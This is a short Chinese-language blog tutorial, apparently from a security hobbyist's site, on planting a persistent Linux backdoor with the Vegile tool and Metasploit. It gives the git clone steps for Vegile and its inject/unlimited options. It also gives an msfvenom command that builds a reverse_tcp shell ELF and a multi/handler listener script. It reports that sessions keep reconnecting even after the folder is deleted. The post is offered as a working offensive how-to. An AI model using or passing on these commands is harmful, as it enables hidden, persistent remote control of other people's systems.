---
title: Vegile_Linux_Backdoor
date: 2018-01-20 00:27:15
tags: Metasploit
categories: Metasploit
---
![enter description here][1]
<!--more-->
##  视频演示
<div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div>
<script type="text/javascript" src="http://demonsec666.oss-cn-qingdao.aliyuncs.com/cytron.core.js"></script>
<script>
    var ivaInstance = new Iva('ivaLive', {
        appkey: 'By9WGzBIx', //应用标示
        video: 'http://demonsec666.oss-cn-qingdao.aliyuncs.com/Vegile_Linux_Backdoor.mp4', //视频
        title: 'test', //视频标题，后台视频管理中的标题
        cover: '' //视频封面，只有在autoplay:false才可生效
    });
</script>
<script src="http://demonsec666.oss-cn-qingdao.aliyuncs.com/lva.js"></script>

``` stylus
git clone https://github.com/Screetsec/Vegile.git
cd Vegile
chmod +x Vegile
```

![enter description here][2]
&nbsp;



## Vegile帮助参数
``` stylus
Vegile -i / --inject [backdoor/rootkit]  (注入)
Vegile -u / --unlimited [backdoor/rootkit] （无数次）
Vegile -h / --help
```

## 1.首先生成linux 木马
``` stylus
msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST=IP LPORT=PORT -b "\x00" -f elf -o NAME_BACKDOOR
```


![enter description here][3]

## 2.建立监听
handler.rc
``` stylus
use exploit/multi/handler
set PAYLOAD linux/x86/shell/reverse_tcp
set LHOST  192.168.1.100
run
```
![enter description here][4]

``` stylus
 msfconsole -r handler.rc 
```
![enter description here][5]
  得到一次会话
![enter description here][6]
 
## 得到会话
并无限制的发送会话
![enter description here][7]
包括把整个文件夹删除 还在 无限制的发送会话
![enter description here][8]


  [1]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/3A4BDF482B386E4C1B18FB9DA91E478A.png
  [2]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1516444135450.jpg
  [3]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1516444270799.jpg
  [4]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1516444382477.jpg
  [5]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1516445509621.jpg
  [6]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1516445482085.jpg
  [7]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1516445549295.jpg 
  [8]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1516444498027.jpg